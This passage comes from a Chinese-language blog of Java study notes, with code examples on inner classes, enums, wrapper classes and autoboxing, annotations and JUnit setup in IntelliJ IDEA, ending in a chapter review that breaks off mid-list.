class="variable">c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C</span>()&#123;&#125;;</span><br><span class="line">        c1.method2();</span><br><span class="line">        </span><br><span class="line">        System.out.println(b.getClass());</span><br><span class="line">        <span class="comment">//class com.atguigu09.inner.OuterClassTest$3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubA</span> <span class="keyword">implements</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;subA&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">subB</span> <span class="keyword">extends</span> <span class="title class_">B</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;subB&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method2</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h3><p>本质上也是一种类，但这个类的对象是有限的固定的几个，不能由用户随意创建，如星期<br>&#x3D;&#x3D;》开发中若某个类其实例个数是固定的，则推荐将此类声明为枚举类，如就职状态，线程状态等</p>
<h4 id="定义枚举类"><a href="#定义枚举类" class="headerlink" title="定义枚举类"></a>定义枚举类</h4><p>使用enum枚举类拥有一个默认父类java.lang.Enum，且不能再继承其他类！！<br>通过类名.对象名调用。示例： Seasons.AUTUMN.show();</p>
<p>&gt;&#x3D;jdk5<br><em>使用关键字enum</em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Seasons</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1. 必须在枚举类开头声明多个对象，对象之间用&#x27;,&#x27;分隔</span></span><br><span class="line">    <span class="comment">//   命名按规范应该全部大写（常量）</span></span><br><span class="line"></span><br><span class="line">    SPRING(<span class="string">&quot;春天&quot;</span>,<span class="string">&quot;3-5&quot;</span>),</span><br><span class="line">    SUMMER(<span class="string">&quot;夏天&quot;</span>,<span class="string">&quot;6-8&quot;</span>),</span><br><span class="line">    AUTUMN(<span class="string">&quot;秋天&quot;</span>,<span class="string">&quot;9-11&quot;</span>),</span><br><span class="line">    WINTER(<span class="string">&quot;冬天&quot;</span>,<span class="string">&quot;12-2&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 声明当前类对象的实例变量，使用private final修饰</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String seasonName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String seasonMonth;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3. 私有化类的构造器</span></span><br><span class="line"></span><br><span class="line">    Seasons(String seasonName, String seasonMonth) &#123;</span><br><span class="line">        <span class="built_in">this</span>.seasonName = seasonName;</span><br><span class="line">        <span class="built_in">this</span>.seasonMonth = seasonMonth;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4. 提供实例变量的get方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSeasonName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> seasonName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSeasonMonth</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> seasonMonth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>了解jdk &lt; jdk5</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Season</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 声明当前类对象的实例变量，使用private final修饰</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String seasonName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String seasonMonth;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1. 私有化类的构造器</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Season</span><span class="params">(String seasonName, String seasonMonth)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.seasonName = seasonName;</span><br><span class="line">        <span class="built_in">this</span>.seasonMonth = seasonMonth;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3. 提供实例变量的get方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSeasonName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> seasonName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSeasonMonth</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> seasonMonth;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4. 创建当前类的实例,利用public static使它可以在类外通过类名.调用</span></span><br><span class="line">    <span class="comment">//   同时使用final避免被修改</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">spring</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>(<span class="string">&quot;春天&quot;</span>,<span class="string">&quot;3-5&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">summer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>(<span class="string">&quot;夏天&quot;</span>,<span class="string">&quot;6-8&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">autumn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>(<span class="string">&quot;秋天&quot;</span>,<span class="string">&quot;9-11&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">winter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>(<span class="string">&quot;冬天&quot;</span>,<span class="string">&quot;12-2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="enum类的常用方法"><a href="#enum类的常用方法" class="headerlink" title="enum类的常用方法"></a>enum类的常用方法</h4><p>String toString(): 默认返回的是常量名（对象名），可以继续手动重写该方法！<br>（<em>重要</em>）static 枚举类型[] values():返回枚举类型的对象数组。该方法可以很方便地遍历所有的枚举值，是一个静态方法<br>（<em>重要</em>）static 枚举类型 valueOf(String name)：可以把一个字符串转为对应的枚举类对象。要求字符串必须是枚举类对象的“名字”。如不是，会有运行时异常：IllegalArgumentException。<br>String name():得到当前枚举常量的名称。建议优先使用toString()。<br>int ordinal():返回当前枚举常量的次序号，默认从0开始</p>
<h4 id="枚举类实现接口"><a href="#枚举类实现接口" class="headerlink" title="枚举类实现接口"></a>枚举类实现接口</h4><p>情况1：枚举类实现接口，在枚举类中重写接口中的抽象方法，当通过不同的枚举类对象调用此方法时，执行的是<em>同一方法</em>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Info</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Seasons</span> <span class="keyword">implements</span> <span class="title class_">Info</span>&#123;</span><br><span class="line"></span><br><span class="line">    SPRING(<span class="string">&quot;春天&quot;</span>,<span class="string">&quot;3-5&quot;</span>),</span><br><span class="line">    <span class="comment">//此处同上文，省略</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是一个季节&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>情况2：让枚举类的每一个对象重写接口中的抽象方法，当通过不同的枚举类对象调用此方法时，执行的是各自<em>不同的实现方法</em>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Info</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Seasons</span> <span class="keyword">implements</span> <span class="title class_">Info</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1. 必须在枚举类开头声明多个对象，对象之间用&#x27;,&#x27;分隔</span></span><br><span class="line">    <span class="comment">//   命名按规范应该全部大写（常量）</span></span><br><span class="line"></span><br><span class="line">    SPRING(<span class="string">&quot;春天&quot;</span>,<span class="string">&quot;3-5&quot;</span>)&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是春天&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    SUMMER(<span class="string">&quot;夏天&quot;</span>,<span class="string">&quot;6-8&quot;</span>)&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是夏天&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    AUTUMN(<span class="string">&quot;秋天&quot;</span>,<span class="string">&quot;9-11&quot;</span>)&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是秋天&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    WINTER(<span class="string">&quot;冬天&quot;</span>,<span class="string">&quot;12-2&quot;</span>)&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是冬天&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此处同上文定义中内容，省略</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSeasonMonth</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> seasonMonth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="枚举类应用"><a href="#枚举类应用" class="headerlink" title="枚举类应用"></a>枚举类应用</h4><p>一个常见应用：员工的就职状态的声明方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Status</span>&#123;</span><br><span class="line">    BUSY,FREE,VOCATION,DEPARTURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>枚举类定义单例模式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Bank</span>&#123;</span><br><span class="line">    CPB;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h3><p>包装类是指Java中每一种基本数据类型对应的类，它们以对象的形式表现基本数据类型，提供了比基本数据类型更多的功能和灵活性。<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240708192632.png" alt="包装类与基本数据类型对应关系"><br>（注意类名与基本数据类型首字母不同）<br>    byte —— Byte<br>    short —— Short<br>    int —— <strong>Integer</strong><br>    long —— Long<br>    float —— Float<br>    double —— Double<br>    char —— <strong>Character</strong><br>    boolean —— Boolean</p>
<h4 id="基本数据类型和包装类之间的转换"><a href="#基本数据类型和包装类之间的转换" class="headerlink" title="基本数据类型和包装类之间的转换"></a>基本数据类型和包装类之间的转换</h4><p>jdk&gt;&#x3D;5.0</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//基本数据类型 --&gt; 包装类 自动装箱--&gt;直接赋值即可</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i1I1</span> <span class="operator">=</span> i1;</span><br><span class="line"><span class="comment">//底层仍然是调用了valueOf()</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i1I2</span> <span class="operator">=</span> i1+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//包装类 --&gt; 基本数据类型 自动拆箱--&gt;直接赋值即可</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> i1I2 </span><br></pre></td></tr></table></figure>


<p>以下方法使用于jdk&lt;5.0下<br>基本数据类型 –&gt; 包装类（便于使用类才能使用的方法）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//此方法已经过时</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i1I1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(i1);</span><br><span class="line"></span><br><span class="line">System.out.println(i1I1.toString());</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="string">&quot;True&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="string">&quot;true1&quot;</span>;</span><br><span class="line"><span class="comment">//只要忽略大小写时不是true都是false</span></span><br><span class="line"><span class="type">Boolean</span> <span class="variable">B1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Boolean</span>(b1);</span><br><span class="line"><span class="type">Boolean</span> <span class="variable">B2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Boolean</span>(b2);</span><br><span class="line">System.out.println(B1.toString());</span><br><span class="line"><span class="comment">//以上语句输出true</span></span><br><span class="line">System.out.println(B2.toString());</span><br><span class="line"><span class="comment">//以上语句输出false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//推荐方法</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i1I2</span> <span class="operator">=</span> Integer.valueOf(i1);</span><br></pre></td></tr></table></figure>

<p>包装类 –&gt; 基本数据类型（便于运算）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">I1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">10</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> I1.intValue();</span><br><span class="line"></span><br><span class="line"><span class="comment">//注意：</span></span><br><span class="line"><span class="type">boolean</span> b1;<span class="comment">//默认初始值为0.0 </span></span><br><span class="line">Boolean B2;<span class="comment">//默认初始值为null</span></span><br></pre></td></tr></table></figure>

<h4 id="基本数据类型、包装类和string之间的转换"><a href="#基本数据类型、包装类和string之间的转换" class="headerlink" title="基本数据类型、包装类和string之间的转换"></a>基本数据类型、包装类和string之间的转换</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> String.valueOf(i1);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">I1</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> String.valueOf(I1);</span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> i1 + <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> Integer.parseInt(str);</span><br><span class="line">System.out.println(i3);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240708200628.png" alt="转换方法示意图"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">j</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>);</span><br><span class="line">    System.out.println(i == j);<span class="comment">//对象地址=对象地址，false</span></span><br><span class="line"></span><br><span class="line">    <span class="type">Integer</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    System.out.println(m == n);<span class="comment">//true</span></span><br><span class="line">    <span class="comment">//自动装箱底层调用的仍是valueOf()，其针对0-127的处理方法是内部已经创建好一个长度为256的从-128~127的对象   数组</span></span><br><span class="line">    <span class="comment">//输入在此范围的将直接用输入作为索引，找到对应数组元素，因此地址相同</span></span><br><span class="line">    <span class="comment">//类似设计的包括所有整型和布尔型的包装类，详见下图</span></span><br><span class="line"></span><br><span class="line">    <span class="type">Integer</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">    System.out.println(x == y);<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">    <span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line">    <span class="type">double</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line">    System.out.println(a == b);<span class="comment">//true存在自动拆箱</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240708202907.png" alt="包装类缓存"></p>
<h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>注解（Annotation）是从<code>JDK5.0</code>开始引入，以“<code>@注解名</code>”在代码中存在。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="comment">//重写</span></span><br><span class="line"><span class="meta">@Deprecated</span> <span class="comment">//过时的</span></span><br><span class="line"><span class="meta">@SuppressWarnings(value=”unchecked”)</span> <span class="comment">//抑制编译器警告</span></span><br></pre></td></tr></table></figure>

<p>Annotation 可以像修饰符一样被使用，可用于修饰包、类、构造器、方法、成员变量、参数、局部变量的声明。还可以添加一些参数值，这些信息被保存在 Annotation 的 “name&#x3D;value” 对中。<br>注解可以在类编译、运行时进行加载，体现不同的功能。</p>
<p>注解也可以看做是一种注释，通过使用 Annotation，程序员可以在不改变原有逻辑的情况下，在源文件中嵌入一些补充信息。但是，注解，不同于单行注释和多行注释。</p>
<ul>
<li>对于单行注释和多行注释是给程序员看的。</li>
<li>而注解是可以被编译器或其他程序读取的。程序还可以根据注解的不同，做出相应的处理。</li>
</ul>
<p>在JavaSE中，注解的使用目的比较简单，例如标记过时的功能，忽略警告等。在<code>JavaEE/Android中注解占据了更重要的角色</code>，例如用来配置应用程序的任何切面，代替JavaEE旧版中所遗留的<code>繁冗代码</code>和<code>XML配置</code>等。<br>未来的开发模式都是基于注解的，JPA是基于注解的，Spring2.5以上都是基于注解的，Hibernate3.x以后也是基于注解的，Struts2有一部分也是基于注解的了。<code>注解是一种趋势</code>，一定程度上可以说：<code>框架 = 注解 + 反射 + 设计模式</code>。</p>
<h4 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h4><p>后续配合反射实现某些自定义操作</p>
<ul>
<li>自定义注解可以通过四个元注解@Retention,@Target，@Inherited,@Documented，分别说明它的声明周期，使用位置，是否被继承，是否被生成到API文档中。</li>
<li>Annotation 的成员在 Annotation 定义中以无参数有返回值的抽象方法的形式来声明，我们又称为配置参数。返回值类型只能是八种基本数据类型、String类型、Class类型、enum类型、Annotation类型、以上所有类型的数组</li>
<li>可以使用 default 关键字为抽象方法指定默认返回值</li>
<li>如果定义的注解含有抽象方法，那么使用时必须指定返回值，除非它有默认值。格式是“方法名 &#x3D; 返回值”，如果只有一个抽象方法需要赋值，且方法名为value，可以省略“value&#x3D;”，所以如果注解只有一个抽象方法成员，建议使用方法名value。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target</span> &#123;TYPE,FIELD，METHOD,CONSTRUCTOR&#125;<span class="comment">//指示注解能够修饰的结构</span></span><br><span class="line"><span class="meta">@Retention</span>&#123;RetentionPolicy.RUNTIME&#125;<span class="comment">//指示注解的生命周期</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyAnnotation &#123;</span><br><span class="line">    String <span class="title function_">value</span><span class="params">()</span>;<span class="comment">//必须加()</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用</span></span><br><span class="line"><span class="meta">@MyAnnotation(value = &quot;class&quot;)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123; </span><br><span class="line">    String name;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="常见的Annotation作用"><a href="#常见的Annotation作用" class="headerlink" title="常见的Annotation作用"></a>常见的Annotation作用</h4><p>@Override</p>
<ul>
<li>用于检测被标记的方法为有效的重写方法，如果不是，则报编译错误！</li>
<li>只能标记在方法上。</li>
<li>它会被编译器程序读取。</li>
</ul>
<p>@Deprecated</p>
<ul>
<li>用于表示被标记的数据已经过时，不推荐使用。</li>
<li>可以用于修饰 属性、方法、构造、类、包、局部变量、参数。</li>
<li>它会被编译器程序读取。</li>
</ul>
<p>@SuppressWarnings</p>
<ul>
<li>抑制编译警告。当我们不希望看到警告信息的时候，可以使用 SuppressWarnings 注解来抑制警告信息</li>
<li>可以用于修饰类、属性、方法、构造、局部变量、参数</li>
<li>它会被编译器程序读取。</li>
<li>可以指定的警告类型有（了解）<ul>
<li>all，抑制所有警告</li>
<li>unchecked，抑制与未检查的作业相关的警告</li>
<li>unused，抑制与未用的程式码及停用的程式码相关的警告</li>
<li>deprecation，抑制与淘汰的相关警告</li>
<li>nls，抑制与非 nls 字串文字相关的警告</li>
<li>null，抑制与空值分析相关的警告</li>
<li>rawtypes，抑制与使用 raw 类型相关的警告</li>
<li>static-access，抑制与静态存取不正确相关的警告</li>
<li>static-method，抑制与可能宣告为 static 的方法相关的警告</li>
<li>super，抑制与置换方法相关但不含 super 呼叫的警告</li>
<li>…</li>
</ul>
</li>
</ul>
<h4 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h4><p>JDK1.5在java.lang.annotation包定义了4个标准的meta-annotation类型，它们被用来提供对其它 annotation类型作说明。</p>
<p>（1）**@Target：**用于描述注解的使用范围</p>
<ul>
<li>可以通过枚举类型ElementType的10个常量对象来指定</li>
<li>TYPE，METHOD，CONSTRUCTOR，PACKAGE…..</li>
</ul>
<p>（2）**@Retention：**用于描述注解的生命周期</p>
<ul>
<li>可以通过枚举类型RetentionPolicy的3个常量对象来指定</li>
<li>SOURCE（源代码）、CLASS（字节码）、RUNTIME（运行时）</li>
<li><code>唯有RUNTIME阶段才能被反射读取到</code>。</li>
</ul>
<p>（3）**@Documented**：表明这个注解应该被 javadoc工具记录。</p>
<p>（4）**@Inherited：**允许子类继承父类中的注解</p>
<h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><p>&#x2F;&#x2F;旧版需要导入包：junit-4.12.jar hamcrest-core-1.3.jar<br>&#x2F;&#x2F;无网络下按视频方法</p>
<p>新版：<br>在测试的方法前一行添加<code>@Test</code> -&gt; Alt+Enter -&gt; 将’JUnit’(任选一个)添加到类路径中 -&gt; 直接运行测试方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JUnitTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240708165221.png" alt="单元测试"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240708164454.png" alt="单元测试示例"></p>
<p>要求：<br>单元测试类必须是public,非abstract,只有一个构造器且此构造器是无参的<br>单元测试方法必须是public,no abstract, no static 无返回值，无参的<br>（不满足此条件的方法可以通过建一个满足的方法调用它）<br>默认情况下，在单元测试方法中使用Scanner时，并不能实现控制台数据的输入。需要做如下设置：</p>
<p>在<code>idea64.exe.vmoptions配置文件</code>(帮助 -&gt; 编辑自定义vm选项)中加入下面一行设置，重启idea后生效。</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">-Deditable.java.test.console</span>=<span class="string">true</span></span><br></pre></td></tr></table></figure>

<p><strong>3. 如果上述位置设置不成功，需要继续修改如下位置</strong><br>修改位置1：IDEA安装目录的bin目录（例如：<code>D:\develop_tools\IDEA\IntelliJ IDEA 2022.1.2\bin</code>）下的idea64.exe.vmoptions文件。<br>修改位置2：C盘的用户目录<code>C:\Users\用户名\AppData\Roaming\JetBrains\IntelliJIdea2022.1</code> 下的idea64.exe.vmoptions&#96;件。</p>
<h4 id="将单元测试方法设置为模板"><a href="#将单元测试方法设置为模板" class="headerlink" title="将单元测试方法设置为模板"></a>将单元测试方法设置为模板</h4><p>设置-&gt;编辑器-&gt;实时模板-&gt; + -&gt;建一个自定义模板组(以后都在CustomerDefine中，可以省略此步) -&gt; + -&gt;新建模板 -&gt;建好后点击左下角定义，选中java -&gt; 确定即可</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240708171159.png" alt="自定义单元测试方法模板"></p>
<h2 id="章节总结"><a href="#章节总结" class="headerlink" title="章节总结"></a>章节总结</h2><p>复习：</p>
<ol>
<li>this关键字的使用:调用属性和方法或构造器时</li>
<li>继承性：<ul>
<li>优点</li>
<li>java继承的特点：类的单继承</li>
<li>子类获取父类的全部属性和方法但因封装性而存在部分不能直接调用</li>
</ul>
</li>
<li>方法的重载和重写及其区别(完全不同)<ul>
<li>重载：两同一不同</li>
<li>重写：前提：类的继承，子类对父类中同名同参数方法的覆盖</li>
</ul>
</li>
<li>super关键字的使用<ul>
<li>调用属性和方法:必须使用的场景</li>
<li>调用构造器：子类构造器中首行要么使用this(形参列表)要么使用super(形参列表)(默认)</li>
</ul>
</li>
<li>子类对象实例化的全过程：子类调用构造器创建对象时一定直接或间接地调用器父类地构造器，并向上回溯直到object的构造器</li>
<li>多态：<ul>
<li>广义上：子类对象的多态性，方法的重写，方法的重载</li>
<li>狭义上：子类对象的多态性</li>
<li>格式</li>
<li>优点</li>
<li>使用：编译看左，运行看右，属性无多态</li>
<li>逆过程：向下转型，instanceof</li>
</ul>
</li>
<li>Object类的使用<ul>
<li>根父类</li>
<li>equals()的使用和重写</li>
<li>toSpring()的使用和重写</li>
</ul>
</li>
<li>static关键字的使用<ul>
<li>随着类的加载而加载、执行</li>
<li>可以修饰属性方法代码块内部类</li>
<li>static修饰的类变量和类方法与不使用的区别<ul>
